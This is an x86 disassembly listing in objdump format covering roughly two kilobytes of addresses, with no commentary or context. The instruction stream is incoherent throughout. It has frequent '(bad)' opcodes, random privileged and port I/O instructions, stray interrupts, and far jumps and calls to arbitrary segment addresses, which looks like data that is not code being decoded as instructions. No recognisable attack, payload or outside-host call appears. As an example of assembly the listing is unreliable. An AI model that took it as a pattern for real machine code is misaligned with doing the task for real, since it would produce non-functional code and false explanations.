  41ffbc:	sbb    dh,BYTE PTR [ebx-0x4908d4b1]
  41ffc2:	sub    ebp,edx
  41ffc4:	aaa    
  41ffc5:	or     edx,DWORD PTR [edi-0x22]
  41ffc8:	jmp    0x52274a0c
  41ffcd:	out    0x20,al
  41ffcf:	cmp    al,0x81
  41ffd1:	out    dx,al
  41ffd2:	pusha  
  41ffd3:	pushf  
  41ffd4:	lahf   
  41ffd5:	dec    esp
  41ffd6:	sbb    cl,BYTE PTR [ebx+0xd]
  41ffd9:	inc    esp
  41ffda:	hlt    
  41ffdb:	jne    0x41ff5d
  41ffdd:	sar    DWORD PTR [ebx-0x52e98012],cl
  41ffe3:	jmp    0xb4e8c52a
  41ffe8:	jle    0x41ffc0
  41ffea:	fsub   DWORD PTR [ecx+esi*2+0x25]
  41ffee:	call   0x6fa48858
  41fff3:	not    esi
  41fff5:	scas   eax,DWORD PTR es:[edi]
  41fff6:	pop    ecx
  41fff7:	imul   esi,DWORD PTR [ecx-0x4f469622],0x36
  41fffe:	int    0x79
  420000:	pop    ecx
  420001:	std    
  420002:	cmp    DWORD PTR [ebx*2+0x7ba7eb08],edx
  420009:	aad    0x7f
  42000b:	outs   dx,DWORD PTR ds:[esi]
  42000c:	mov    DWORD PTR [eax],ebx
  42000e:	mov    WORD PTR [edx],es
  420010:	jae    0x420046
  420012:	test   BYTE PTR [di+0x677d],bl
  420017:	fdiv   DWORD PTR [ebx+0x1f]
  42001a:	test   DWORD PTR [esi],edi
  42001c:	mov    bh,0xce
  42001e:	test   eax,0x67e40fd5
  420023:	xchg   edx,eax
  420024:	icebp  
  420025:	hlt    
  420026:	aam    0xc5
  420028:	popa   
  420029:	sti    
  42002a:	xor    ah,ch
  42002c:	(bad)  
  42002d:	jge    0x42008f
  42002f:	iret   
  420030:	(bad)  
  420031:	retf   0xa2a0
  420034:	inc    ebp
  420035:	int    0x95
  420037:	mov    dl,0x79
  420039:	xor    dh,bl
  42003b:	das    
  42003c:	jge    0x420053
  42003e:	ror    DWORD PTR [ebx+0x12b2829b],1
  420044:	pop    ds
  420045:	adc    BYTE PTR [eax-0x20],ch
  420048:	aam    0xb5
  42004a:	or     al,0x6e
  42004c:	(bad)  
  42004d:	mov    ds:0xbaa05a47,al
  420052:	cs cmp eax,0x2b4a683
  420058:	cld    
  420059:	pop    esi
  42005a:	and    BYTE PTR [edx+ebx*4],ah
  42005d:	frstor [ecx-0x8]
  420060:	sub    bh,BYTE PTR [ecx-0x1b8cfbab]
  420066:	int3   
  420067:	mov    ds:0xab64426,eax
  42006c:	and    BYTE PTR [esi-0x1fcec2a7],dh
  420072:	pop    di
  420074:	cli    
  420075:	mov    edi,0x713bd2b7
  42007a:	xor    edi,edi
  42007c:	and    BYTE PTR [ebx+0x3d],0xc2
  420080:	push   cs
  420081:	vmread DWORD PTR [ecx],edi
  420084:	daa    
  420085:	retf   
  420086:	leave  
  420087:	call   0xbcf17b67
  42008c:	mov    ah,0xb9
  42008e:	stos   BYTE PTR es:[edi],al
  42008f:	loop   0x4200fd
  420091:	push   es
  420092:	loopne 0x42007d
  420094:	cs pop edx
  420096:	mov    esp,0xbd3692f8
  42009b:	cmp    BYTE PTR [eax*2+0x39f2f3e3],cl
  4200a2:	jo     0x42005c
  4200a4:	add    al,0x63
  4200a6:	or     ah,cl
  4200a8:	sbb    DWORD PTR [eax+0x6dd0a11f],0xffffffbc
  4200af:	cli    
  4200b0:	mov    ebx,?
  4200b2:	in     eax,0x1f
  4200b4:	pop    ecx
  4200b5:	out    0x31,eax
  4200b7:	xlat   BYTE PTR ds:[ebx]
  4200b8:	std    
  4200b9:	adc    BYTE PTR [ebx-0x1c],dl
  4200bc:	xchg   ebp,eax
  4200bd:	pop    ebx
  4200be:	mov    edi,0xf9512976
  4200c3:	inc    edi
  4200c4:	fisttp QWORD PTR [ecx]
  4200c6:	jno    0x420093
  4200c8:	pushf  
  4200c9:	test   eax,0xcf8488df
  4200ce:	inc    eax
  4200cf:	pushf  
  4200d0:	fild   DWORD PTR [esi+0x7d]
  4200d3:	mov    cl,0x32
  4200d5:	(bad)  
  4200d6:	pop    esi
  4200d7:	fsub   DWORD PTR [eax-0x18516ba3]
  4200dd:	mov    dh,BYTE PTR [esi-0x3423d52]
  4200e3:	xchg   DWORD PTR [esi+0x7a],esi
  4200e6:	pop    es
  4200e7:	fld    QWORD PTR [ebp+0x36b0a038]
  4200ed:	mov    ecx,?
  4200ef:	adc    DWORD PTR [eax+0x5c10cd7d],eax
  4200f5:	popa   
  4200f6:	pop    ebp
  4200f7:	aad    0xfc
  4200f9:	idiv   BYTE PTR [edi-0x4cc803f8]
  4200ff:	mov    edx,0x4c6e06fa
  420104:	jmp    0x4200ec
  420106:	mov    WORD PTR [ebx],ds
  420108:	gs data16 imul ch
  42010c:	mov    esi,0xd1870c6e
  420111:	inc    esp
  420112:	jb     0x42010f
  420114:	push   esi
  420115:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420116:	inc    eax
  420117:	bound  ecx,QWORD PTR [ebp+ebp*4+0x3a32fa39]
  42011e:	jns    0x420142
  420120:	pop    ebx
  420121:	je     0x420100
  420123:	outs   dx,DWORD PTR ds:[esi]
  420124:	mov    cl,0x1e
  420126:	pop    esi
  420127:	lar    esp,WORD PTR [ebp+0x57]
  42012b:	cmp    al,0x35
  42012d:	fstp   TBYTE PTR [eax]
  42012f:	je     0x42018f
  420131:	addr16 daa 
  420133:	push   ds
  420134:	fwait
  420135:	xchg   ecx,eax
  420136:	jns    0x42014b
  420138:	loope  0x420178
  42013a:	jmp    0x1cc5:0x8305f571
  420141:	add    esi,DWORD PTR [edx]
  420143:	mov    edi,0xbfec36db
  420148:	add    BYTE PTR [ebp-0x3e],0xec
  42014c:	cwde   
  42014d:	test   al,0xa3
  42014f:	sbb    al,0x47
  420151:	ins    BYTE PTR es:[edi],dx
  420152:	inc    ebx
  420153:	les    ebx,FWORD PTR [ebx]
  420155:	gs pop ecx
  420157:	popa   
  420158:	cwde   
  420159:	in     al,dx
  42015a:	pop    edx
  42015b:	imul   esp,DWORD PTR [esp+ebp*8-0x3358b107],0xffffffd6
  420163:	xchg   esp,eax
  420164:	add    eax,0x4d719170
  420169:	jbe    0x420185
  42016b:	cmp    ch,BYTE PTR [eax+0x3b9086fc]
  420171:	jb     0x42019a
  420173:	loope  0x4201c9
  420175:	pop    ebx
  420176:	sar    esi,1
  420178:	add    al,0xd2
  42017a:	rol    DWORD PTR [edi-0x1f],cl
  42017d:	popf   
  42017e:	sub    DWORD PTR [eax+0x76],edx
  420181:	scas   ax,WORD PTR es:[edi]
  420183:	lea    ebx,[ecx-0x17]
  420186:	out    0xde,al
  420188:	fadd   st(2),st
  42018a:	push   ecx
  42018b:	(bad)  
  42018c:	fcom   DWORD PTR [eax]
  42018e:	mov    WORD PTR [ebx+0xe],cs
  420191:	xor    edx,DWORD PTR [edx]
  420193:	adc    BYTE PTR [eax-0x59],al
  420196:	sub    ebx,DWORD PTR [ebx]
  420198:	adc    al,0x4d
  42019a:	push   ds
  42019b:	xchg   ecx,eax
  42019c:	sti    
  42019d:	cmc    
  42019e:	pop    edi
  42019f:	data16 ja 0x4201cc
  4201a2:	xchg   ebp,eax
  4201a3:	daa    
  4201a4:	fstp   QWORD PTR [ecx]
  4201a6:	xor    al,0xbc
  4201a8:	ins    DWORD PTR es:[edi],dx
  4201a9:	and    al,0x9a
  4201ab:	ins    DWORD PTR es:[edi],dx
  4201ac:	push   edi
  4201ad:	gs inc edi
  4201af:	adc    al,0x50
  4201b1:	shl    BYTE PTR [edi+0x1b],0xa9
  4201b5:	adc    BYTE PTR [edx],bl
  4201b7:	(bad)
  4201ba:	xchg   edx,ebx
  4201bc:	ret    
  4201bd:	sbb    BYTE PTR [edi+edx*1+0x34],ch
  4201c1:	shl    BYTE PTR [ecx-0x3d2d9ac9],1
  4201c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4201c8:	popa   
  4201c9:	fsub   DWORD PTR [ecx]
  4201cb:	(bad)  
  4201cd:	in     al,0x1a
  4201cf:	(bad)  
  4201d0:	pop    edi
  4201d1:	jns    0x420211
  4201d3:	aaa    
  4201d4:	ss cdq 
  4201d6:	adc    al,bh
  4201d8:	mov    ch,0x31
  4201da:	sub    bh,cl
  4201dc:	das    
  4201dd:	lods   eax,DWORD PTR ds:[esi]
  4201de:	imul   edx,DWORD PTR [ecx-0x199d7b9f],0xfffffff8
  4201e5:	push   edi
  4201e6:	sbb    DWORD PTR [edx],edi
  4201e8:	mov    DWORD PTR [ebp+eax*2+0x4],edx
  4201ec:	pusha  
  4201ed:	or     eax,0x45479abe
  4201f2:	pop    ss
  4201f3:	arpl   ax,si
  4201f5:	loope  0x420262
  4201f7:	call   0x61181df1
  4201fc:	je     0x42021a
  4201fe:	hlt    
  4201ff:	cmp    BYTE PTR [edi-0xc],ah
  420202:	das    
  420203:	mov    ch,0xbc
  420205:	ins    BYTE PTR es:[edi],dx
  420206:	arpl   si,cx
  420208:	rcr    BYTE PTR [ebx],cl
  42020a:	dec    ecx
  42020b:	xchg   ebp,eax
  42020c:	(bad)  
  42020d:	adc    cl,ah
  42020f:	outs   dx,BYTE PTR ds:[esi]
  420210:	into   
  420211:	and    eax,0xd9ef9a7c
  420216:	jle    0x420290
  420218:	repz mov dl,0x70
  42021b:	(bad)  
  42021c:	into   
  42021d:	icebp  
  42021e:	(bad)  
  42021f:	popa   
  420220:	xchg   edi,eax
  420221:	inc    eax
  420222:	aaa    
  420223:	inc    esi
  420224:	fld    TBYTE PTR [edx+ecx*1]
  420227:	dec    edx
  420228:	outs   dx,BYTE PTR ds:[esi]
  420229:	enter  0xe678,0xf5
  42022d:	ret    0x9a21
  420230:	cld    
  420231:	xor    al,0xa
  420233:	adc    ah,BYTE PTR [ecx-0x55]
  420236:	adc    BYTE PTR [ebx+0x34],cl
  420239:	mov    ebx,0xb9770e83
  42023e:	in     al,dx
  42023f:	stos   BYTE PTR es:[edi],al
  420240:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420241:	adc    BYTE PTR [esi],al
  420243:	das    
  420244:	imul   eax,DWORD PTR ds:0x602af622,0x5b2b17
  42024e:	add    BYTE PTR [eax],al
  420250:	add    BYTE PTR [eax],al
  420252:	xchg   esi,eax
  420253:	test   BYTE PTR [ebp-0x2],al
  420256:	push   edi
  420257:	(bad)  
  420258:	mov    edi,0xa59b80ec
  42025d:	and    BYTE PTR [esi+0x27],ah
  420260:	mov    BYTE PTR [ecx],bh
  420262:	mov    edi,0xf300017c
  420267:	add    al,0x0
  420269:	add    BYTE PTR [ecx-0x71],bh
  42026c:	cmp    bl,BYTE PTR [eax+0x2c7ed26c]
  420272:	sub    eax,0x84c8bbda
  420277:	ins    BYTE PTR es:[edi],dx
  420278:	test   eax,0x83925b28
  42027d:	mov    esp,0x8a9df694
  420282:	mov    ecx,0x952b7597
  420287:	aad    0xc8
  420289:	mov    esp,0x4eebe329
  42028e:	sar    edx,1
  420290:	dec    eax
  420291:	(bad)  
  420294:	rcr    ah,0x53
  420297:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420298:	pop    esp
  420299:	outs   dx,DWORD PTR ds:[esi]
  42029a:	sub    al,0x95
  42029c:	inc    eax
  42029d:	das    
  42029e:	pop    edi
  42029f:	std    
  4202a0:	adc    edx,DWORD PTR [edx-0x182b6bf8]
  4202a6:	fwait
  4202a7:	mov    al,ds:0x23adc77f
  4202ac:	sahf   
  4202ad:	scas   eax,DWORD PTR es:[edi]
  4202ae:	loope  0x42032f
  4202b0:	call   FWORD PTR [ebx+0x26]
  4202b3:	xor    BYTE PTR [edi],bh
  4202b5:	mov    edi,ss
  4202b7:	aaa    
  4202b8:	jbe    0x4202b3
  4202ba:	pushf  
  4202bb:	test   BYTE PTR [eax],ch
  4202bd:	dec    ebp
  4202be:	inc    esp
  4202bf:	test   eax,0x568d3655
  4202c4:	mov    cl,0xc9
  4202c6:	cmp    eax,0xf2c2dac7
  4202cb:	fisubr DWORD PTR [esi+esi*4]
  4202ce:	push   ebx
  4202cf:	push   esi
  4202d0:	xchg   ebx,eax
  4202d1:	test   BYTE PTR [ecx+ecx*2-0x29],0x3d
  4202d6:	outs   dx,BYTE PTR ds:[esi]
  4202d7:	imul   ecx,DWORD PTR [ebx+0x64],0x3c8c03a4
  4202de:	les    ebp,FWORD PTR [ecx+0x52]
  4202e1:	inc    edi
  4202e2:	outs   dx,DWORD PTR ds:[esi]
  4202e3:	cmp    ecx,DWORD PTR [ebp+edx*8-0x79025df5]
  4202ea:	inc    edx
  4202eb:	mov    cl,0xc4
  4202ed:	retf   
  4202ee:	gs mov ebp,0x7d09302d
  4202f4:	ja     0x420339
  4202f6:	mov    bh,0x1a
  4202f8:	out    0xb0,al
  4202fa:	adc    DWORD PTR [eax],ebp
  4202fc:	inc    ecx
  4202fd:	push   ebp
  4202fe:	arpl   WORD PTR [edi+0x1b72e712],dx
  420304:	int    0xd
  420306:	pusha  
  420307:	sbb    al,0x27
  420309:	lods   eax,DWORD PTR ds:[esi]
  42030a:	inc    eax
  42030b:	ja     0x420368
  42030d:	fs pop ds
  42030f:	mov    esp,0x886774a2
  420314:	mov    edx,0xe81df5a6
  420319:	xchg   esi,eax
  42031a:	xchg   edi,eax
  42031b:	pop    esp
  42031c:	sahf   
  42031d:	loopne 0x420368
  42031f:	jmp    0x53dd:0x716837a0
  420326:	adc    cl,dl
  420328:	jb     0x42037d
  42032a:	arpl   WORD PTR [eax-0x6f],cx
  42032d:	aam    0xf1
  42032f:	add    eax,0x9972073d
  420334:	cmp    al,0xab
  420336:	xor    ch,BYTE PTR [ecx+edx*1]
  420339:	lods   al,BYTE PTR ds:[esi]
  42033a:	(bad)  
  42033b:	jecxz  0x420334
  42033d:	pop    ss
  42033e:	imul   edi,DWORD PTR [ecx],0x583ca159
  420344:	pop    ss
  420345:	test   DWORD PTR [edi+eiz*1],eax
  420348:	pop    edx
  420349:	xchg   ebx,eax
  42034a:	jbe    0x420357
  42034c:	jle    0x42030c
  42034e:	xchg   edx,eax
  42034f:	push   ebp
  420350:	test   BYTE PTR [esi+0xb],0xc7
  420354:	sub    eax,0xfd8bed89
  420359:	mov    ch,0x3f
  42035b:	inc    edi
  42035c:	cmp    ebx,ebx
  42035e:	mov    eax,0xe0f508bd
  420363:	push   ebp
  420364:	(bad)  
  420366:	imul   ebp,esp,0xffffffbc
  420369:	aaa    
  42036a:	pop    ebp
  42036b:	inc    edx
  42036c:	scas   al,BYTE PTR es:[edi]
  42036d:	pop    ss
  42036e:	leave  
  42036f:	pop    es
  420370:	stos   BYTE PTR es:[edi],al
  420371:	neg    ebx
  420373:	mov    DWORD PTR [ecx+0x28801cd2],ebx
  420379:	inc    dx
  42037b:	mov    ah,BYTE PTR [ebp+0x591969c7]
  420381:	jle    0x42037e
  420383:	xchg   DWORD PTR [eax],edx
  420385:	mov    cl,0x67
  420387:	dec    eax
  420388:	jno    0x420343
  42038a:	int    0xd2
  42038c:	mov    ecx,0xc09a3bbe
  420391:	scas   eax,DWORD PTR es:[edi]
  420392:	sbb    BYTE PTR [edi+edx*4+0x45b37909],al
  420399:	adc    edx,ebp
  42039b:	mov    al,0x1c
  42039d:	push   edi
  42039e:	rol    DWORD PTR [eax],cl
  4203a0:	stc    
  4203a1:	sub    BYTE PTR [edx+0x5a],dh
  4203a4:	call   0xd42d2f04
  4203a9:	lock ins BYTE PTR es:[edi],dx
  4203ab:	ins    DWORD PTR es:[edi],dx
  4203ac:	mov    eax,DWORD PTR [eax+0x9431f0b]
  4203b2:	push   edx
  4203b3:	xor    BYTE PTR [ecx+0x1256c80c],dh
  4203b9:	pop    ss
  4203ba:	mov    es:0xcbec935d,al
  4203c0:	ret    0x46a3
  4203c3:	mov    ss,WORD PTR [eax+0x3236b9ce]
  4203c9:	or     ecx,DWORD PTR [eax+ecx*8+0x3c]
  4203cd:	push   cs
  4203ce:	add    cl,cl
  4203d0:	push   edi
  4203d1:	data16 jns 0x4203ac
  4203d4:	cmp    ebp,DWORD PTR [ebx+0x8]
  4203d7:	sub    BYTE PTR es:[edx],cl
  4203da:	sar    BYTE PTR [bx+si],cl
  4203dd:	loopne 0x42044f
  4203df:	cmc    
  4203e0:	popf   
  4203e1:	jle    0x42037d
  4203e3:	bound  edi,QWORD PTR [ebx+0x42]
  4203e6:	ret    
  4203e7:	ds pushf 
  4203e9:	jmp    0x420414
  4203eb:	(bad)  
  4203ec:	aad    0x42
  4203ee:	ins    BYTE PTR es:[edi],dx
  4203ef:	fwait
  4203f0:	and    dl,BYTE PTR [edi-0x7f]
  4203f3:	(bad)  
  4203f5:	pop    ecx
  4203f6:	mov    bl,0x96
  4203f8:	mov    WORD PTR [edi+0x6b740e79],?
  4203fe:	gs sub ecx,eax
  420401:	pop    es
  420402:	mov    WORD PTR [ecx],ss
  420404:	mov    DWORD PTR [ebp+0x53],ecx
  420407:	mov    ebx,0xabb0cbca
  42040c:	je     0x42041f
  42040e:	mov    al,0xc8
  420410:	inc    ecx
  420411:	clc    
  420412:	inc    ecx
  420413:	loopne 0x420421
  420415:	je     0x4203c9
  420417:	lods   al,BYTE PTR es:[esi]
  420419:	xchg   edi,eax
  42041a:	adc    eax,0x4a63dfbb
  42041f:	pusha  
  420420:	out    dx,al
  420421:	cmp    DWORD PTR [ebx+0x28],ebx
  420424:	lods   al,BYTE PTR ds:[esi]
  420425:	mov    DWORD PTR [esi],edx
  420427:	aad    0x25
  420429:	inc    edi
  42042a:	jg     0x4203e7
  42042c:	stc    
  42042d:	in     al,dx
  42042e:	xor    DWORD PTR [esp+edi*1+0x2cfdcb67],0x5c1f8230
  420439:	cmp    esp,esi
  42043b:	cmp    al,0xaa
  42043d:	xor    al,0x25
  42043f:	outs   dx,DWORD PTR ds:[esi]
  420440:	(bad)  
  420441:	fdiv   QWORD PTR [ecx-0x344d472f]
  420447:	ss cs xor al,0x1c
  42044b:	jae    0x420480
  42044d:	(bad)  
  42044e:	xor    al,al
  420450:	mov    eax,ds:0xf2db0f21
  420455:	inc    edi
  420456:	outs   dx,DWORD PTR ds:[esi]
  420457:	arpl   WORD PTR [esi],sp
  420459:	scas   al,BYTE PTR es:[edi]
  42045a:	fcomip st,st(1)
  42045c:	xchg   edi,eax
  42045d:	stos   DWORD PTR es:[edi],eax
  42045e:	or     DWORD PTR [esi+ebx*1],edx
  420461:	add    ah,bh
  420463:	ret    0x7b5f
  420466:	push   0xd130788f
  42046b:	mov    cl,0x6a
  42046d:	sub    eax,DWORD PTR [edx]
  42046f:	and    al,0x8
  420471:	lahf   
  420472:	sbb    BYTE PTR [ecx+0x3],0xbf
  420476:	retf   
  420477:	int    0xed
  420479:	shl    BYTE PTR [eax+0x29],cl
  42047c:	push   edi
  42047d:	iret   
  42047e:	dec    ecx
  42047f:	cmp    al,0xf6
  420481:	mov    esp,0x212cb28c
  420486:	mov    WORD PTR [eax-0x3b451f2c],ds
  42048c:	fs mov ebx,0x5949e2b3
  420492:	shl    DWORD PTR [ebp-0x33],cl
  420495:	aaa    
  420496:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420497:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420498:	rol    DWORD PTR [ecx+0xc],cl
  42049b:	std    
  42049c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42049d:	stos   BYTE PTR es:[edi],al
  42049e:	jmp    0x7fe:0xb89937ec
  4204a5:	idiv   BYTE PTR [ebx]
  4204a7:	cmp    BYTE PTR ds:[ecx-0x5599e0f0],ah
  4204ae:	xchg   ebx,eax
  4204af:	lock fisub WORD PTR [ecx+eax*8]
  4204b3:	jno    0x420457
  4204b5:	mov    bh,0x38
  4204b7:	xor    cl,0x86
  4204ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4204bb:	xchg   BYTE PTR [ecx+0x7a],bl
  4204be:	imul   ecx,DWORD PTR [esi+0x68],0x3716fb15
  4204c5:	jl     0x4204e7
  4204c7:	pop    ebp
  4204c8:	int    0x1f
  4204ca:	ins    DWORD PTR es:[edi],dx
  4204cb:	xlat   BYTE PTR ds:[ebx]
  4204cc:	pop    ebp
  4204cd:	cmp    BYTE PTR [eax],0x7b
  4204d0:	cld    
  4204d1:	mov    WORD PTR [edx+0x67d13c01],fs
  4204d7:	sbb    eax,0x59d7c4bd
  4204dc:	inc    eax
  4204dd:	je     0x4204c1
  4204df:	sbb    dl,BYTE PTR [esi]
  4204e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4204e2:	mov    bl,0xf2
  4204e4:	pop    esi
  4204e5:	push   0xffffffcd
  4204e7:	aas    
  4204e8:	retf   0xe16b
  4204eb:	push   edx
  4204ec:	std    
  4204ed:	retf   0x7f49
  4204f0:	popf   
  4204f1:	jg     0x42051c
  4204f3:	cld    
  4204f4:	adc    al,0x4f
  4204f6:	push   ds
  4204f7:	fcom   DWORD PTR [edx]
  4204f9:	int    0xf6
  4204fb:	addr16 js 0x420510
  4204fe:	jmp    0xa3349561
  420503:	push   ebp
  420504:	ja     0x420579
  420506:	mov    ds:0xf1ce2a8b,al
  42050b:	jns    0x4204f6
  42050d:	and    bl,BYTE PTR [eax+eax*1+0x5b]
  420511:	(bad)  
  420512:	fs test al,0xcb
  420515:	push   ebx
  420516:	fld    QWORD PTR [eax+0x3a]
  420519:	enter  0x8d5a,0x24
  42051d:	jmp    0x3f7af188
  420522:	imul   edi,DWORD PTR [edi-0x5b8ab3eb],0xd8ce2be5
  42052c:	and    cl,BYTE PTR [eax+0x5808f24d]
  420532:	outs   dx,BYTE PTR ds:[esi]
  420533:	xchg   ecx,eax
  420534:	push   esi
  420535:	das    
  420536:	ins    BYTE PTR es:[edi],dx
  420537:	test   al,0x20
  420539:	or     dl,BYTE PTR [edx]
  42053b:	lea    ecx,[ecx-0x6e]
  42053e:	scas   al,BYTE PTR es:[edi]
  42053f:	and    eax,0x3896f052
  420544:	sar    BYTE PTR [ebx+0x60ae457],1
  42054a:	mov    ss,WORD PTR [esi-0x6996046a]
  420550:	cmp    DWORD PTR [ecx+0x25dfb2c9],esi
  420556:	push   esp
  420557:	mov    ebp,0xfc9c758
  42055c:	pop    edx
  42055d:	xlat   BYTE PTR ds:[ebx]
  42055e:	std    
  42055f:	pop    esi
  420560:	mov    bh,0x2a
  420562:	push   es
  420563:	je     0x4204ff
  420565:	and    esi,DWORD PTR [ecx+0x2e]
  420568:	sub    BYTE PTR [ecx+0x3a],bh
  42056b:	inc    eax
  42056c:	or     BYTE PTR [eax],cl
  42056e:	test   esi,edx
  420570:	push   es
  420571:	pop    ss
  420572:	or     dx,sp
  420575:	retf   0xe1e9
  420578:	sub    bh,BYTE PTR [edi+0x7133e782]
  42057e:	cld    
  42057f:	mov    ebx,eax
  420581:	inc    ebx
  420582:	lahf   
  420583:	ins    DWORD PTR es:[edi],dx
  420584:	dec    esp
  420585:	mov    BYTE PTR [edi+0x43],dl
  420588:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420589:	dec    ebx
  42058a:	sbb    al,BYTE PTR ds:0x21e11e42
  420590:	arpl   WORD PTR ds:0x8a23e2a5,ax
  420596:	mov    bl,0x9
  420598:	xchg   ebp,eax
  420599:	adc    eax,0x2110a401
  42059e:	and    al,0xf2
  4205a0:	push   esp
  4205a1:	dec    ebp
  4205a2:	rcl    BYTE PTR [edx+eax*1-0x1973de69],0xc8
  4205aa:	dec    DWORD PTR [esp+ecx*8-0x6bde1466]
  4205b1:	aad    0xc6
  4205b3:	mov    edi,0x3decba7f
  4205b8:	in     al,dx
  4205b9:	in     al,dx
  4205ba:	jp     0x4205fe
  4205bc:	mov    BYTE PTR [ebx],ch
  4205be:	mov    esi,0xdb8c205f
  4205c3:	loopne 0x420582
  4205c5:	enter  0x90bd,0x35
  4205c9:	ja     0x420610
  4205cb:	mov    ecx,0x8479937e
  4205d0:	imul   ebp,DWORD PTR [eax],0xffffff9b
  4205d3:	fisubr WORD PTR [edi-0x62]
  4205d6:	sub    BYTE PTR [esi],ch
  4205d8:	fyl2xp1 
  4205da:	ret    
  4205db:	inc    ebx
  4205dc:	(bad)  
  4205dd:	jmp    0x7e48:0x16fadc10
  4205e4:	call   0xdf92:0x6157e987
  4205eb:	cli    
  4205ec:	sub    al,0x7d
  4205ee:	mov    ss,WORD PTR ds:0xa976d20e
  4205f4:	xchg   ebx,eax
  4205f5:	cmp    ah,BYTE PTR [esi-0x32]
  4205f8:	out    dx,al
  4205f9:	sbb    DWORD PTR [esi],ebp
  4205fb:	pop    esp
  4205fc:	dec    ebx
  4205fd:	mov    esi,0xf2955694
  420602:	mov    ecx,0x90237071
  420607:	je     0x4205d8
  420609:	pop    edx
  42060a:	add    dl,BYTE PTR [ecx+0xe]
  42060d:	sub    DWORD PTR [edx],edi
  42060f:	pop    eax
  420610:	jmp    0x534ef907
  420615:	mov    ss,WORD PTR [edi+0x2a]
  420618:	push   esp
  420619:	jg     0x42064c
  42061b:	push   cs
  42061c:	clc    
  42061d:	fild   WORD PTR [edx-0x15418eb9]
  420623:	or     ecx,0x4b
  420626:	ds stc 
  420628:	or     DWORD PTR [edx],ebp
  42062a:	adc    eax,0x5f53e886
  42062f:	inc    esi
  420630:	xor    al,0xbd
  420632:	mov    ds:0xee3780c0,al
  420637:	mov    ebp,0x64d3cf22
  42063c:	call   0xe02c:0xd686d39e
  420643:	mov    al,0x45
  420645:	data16 add cl,BYTE PTR [esi]
  420648:	in     al,dx
  420649:	mov    edi,0xb713b022
  42064e:	(bad)  
  420650:	sar    esp,0xa2
  420653:	jmp    0x5c10:0x8448d33c
  42065a:	cmp    eax,ebx
  42065c:	out    0xf6,al
  42065e:	or     dl,BYTE PTR [eax+0x4b607b81]
  420664:	cmp    esi,DWORD PTR [esi+0x8]
  420667:	daa    
  420668:	repnz out dx,eax
  42066a:	ds push eax
  42066c:	pushw  cs
  42066e:	ss lahf 
  420670:	push   eax
  420671:	mov    bl,0xe2
  420673:	cdq    
  420674:	jmp    0x4206ad
  420676:	daa    
  420677:	xchg   ecx,eax
  420678:	pushf  
  420679:	dec    esp
  42067a:	mov    bl,0x54
  42067c:	adc    eax,0x227bef99
  420681:	inc    esi
  420682:	inc    eax
  420683:	test   DWORD PTR [ebx+0x7],0xcee27b24
  42068a:	clc    
  42068b:	push   ebp
  42068c:	loop   0x420704
  42068e:	add    ch,0x76
  420691:	sub    BYTE PTR [ecx],dl
  420693:	jp     0x420636
  420695:	out    0xbf,eax
  420697:	jno    0x42066c
  420699:	push   0x42
  42069b:	in     eax,0xc4
  42069d:	into   
  42069e:	sbb    ah,BYTE PTR [ebx]
  4206a0:	scas   al,BYTE PTR es:[edi]
  4206a1:	jmp    0x9900:0x2f1cf73b
  4206a8:	pop    edi
  4206a9:	xchg   ebp,eax
  4206aa:	jmp    0x6fc4:0x7a5c90f5
  4206b1:	loop   0x42065a
  4206b3:	jns    0x4206b2
  4206b5:	lahf   
  4206b6:	shl    DWORD PTR [ebx],1
  4206b8:	adc    ah,BYTE PTR [eax+ebp*8+0x7121159]
  4206bf:	imul   DWORD PTR [edx-0x36]
  4206c2:	mov    ebx,0xd9c96b96
  4206c7:	mov    ds:0xe5be06c8,eax
  4206cc:	std    
  4206cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4206ce:	aas    
  4206cf:	jo     0x420707
  4206d1:	mov    ebp,0xd9a4994d
  4206d6:	pop    ebx
  4206d7:	inc    ebx
  4206d8:	jne    0x4206b1
  4206da:	retfw  0x88ee
  4206de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4206df:	push   es
  4206e0:	(bad)  
  4206e1:	jae    0x420669
  4206e3:	(bad)  
  4206e4:	dec    ecx
  4206e5:	es cwde 
  4206e7:	push   0xb9c2e3cd
  4206ec:	(bad)  
  4206ed:	outs   dx,DWORD PTR ds:[esi]
  4206ee:	repnz fidiv DWORD PTR [edi-0x66]
  4206f2:	xchg   ebx,eax
  4206f3:	out    0x21,al
  4206f5:	xor    BYTE PTR [ebp+0x19],dl
  4206f8:	fadd   DWORD PTR [edi-0x1c5e50c3]
  4206fe:	mov    eax,0x933c08ef
  420703:	mov    edi,0xf3d1057f
  420708:	mov    bl,BYTE PTR [ecx]
  42070a:	adc    ebp,DWORD PTR [ebx+0x57]
  42070d:	js     0x420758
  42070f:	fst    QWORD PTR [edi+0x29]
  420712:	dec    ebp
  420713:	adc    BYTE PTR [edi],0xb9
  420716:	dec    ebp
  420717:	inc    eax
  420718:	not    BYTE PTR [edx+0x6ea4962a]
  42071e:	mov    edi,0xed6e8112
  420723:	rcr    DWORD PTR gs:[ebp-0x7ebd68a8],1
  42072a:	ret    0x1bd6
  42072d:	bndldx (bad),[eax+0x38]
  420731:	dec    esp
  420732:	imul   ecx,eax,0xffffffb4
  420735:	ret    0xd820
  420738:	sbb    DWORD PTR [ecx],esi
  42073a:	test   eax,0x7d60af2d
  42073f:	loopne 0x420736
  420741:	es xchg esp,eax
  420743:	cli    
  420744:	fucom  st(1)
  420746:	mov    dh,0xc2
  420748:	xchg   esp,eax
  420749:	xchg   ebx,eax
  42074a:	in     al,0x1c
  42074c:	bound  esp,QWORD PTR [edx+ecx*2+0xb7a5997]
  420753:	push   ds
  420754:	outs   dx,DWORD PTR ds:[esi]
  420755:	pusha  
  420756:	pop    esp
  420757:	daa    
  420758:	mov    bl,0xee
  42075a:	inc    esp
  42075b:	adc    eax,0x76
  420760:	add    BYTE PTR [eax],al
  420762:	and    DWORD PTR [edi],ebx
  420764:	fld    QWORD PTR [esi]
  420766:	inc    esi
  420768:	sti    
  420769:	aas    
